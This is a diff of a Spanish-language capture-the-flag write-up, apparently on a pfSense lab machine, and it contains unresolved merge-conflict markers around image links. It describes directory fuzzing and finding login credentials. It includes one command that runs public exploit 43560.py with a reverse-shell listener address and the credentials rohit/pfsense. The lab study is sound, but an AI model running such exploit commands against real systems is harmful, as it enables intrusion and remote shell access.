@@ -24,7 +24,11 @@ Y en el txt previamente enumerado podemos ver que han mitigado 2 vulnerabilidade
 ![](Pasted%20image%2020260424162418.png)
 
 Al hacerle fuzzing podemos ver que hay muchos más directorios que pueden ser interesantes, los cuáles vamos a enumerar para ver si tienen algún tipo de fichero importante.
+<<<<<<< HEAD
 ![](Pasted%20image%2020260424162705.png) 
+=======
+![](/Img/Pasted%20image%2020260424162705.png) 
+>>>>>>> origin/main
 
 Después de otra enumeración con un diccionario más grande  y buscando extensiones encuentro un fichero txt interesante que es system-users.txt que al acceder veremos cuales son las credenciales para logearnos.
 ```bash
@@ -43,4 +47,8 @@ Podemos observar que es la versión 2.1.3 la cuál buscando encontré este scrip
 python3 43560.py --rhost 10.129.24.14 --lhost 10.10.14.180 --lport 4444 --username rohit --password pfsense
 ```
 
+<<<<<<< HEAD
 ![](Pasted%20image%2020260424183920.png)
+=======
+![](/img/Pasted%20image%2020260424183920.png)
+>>>>>>> origin/main
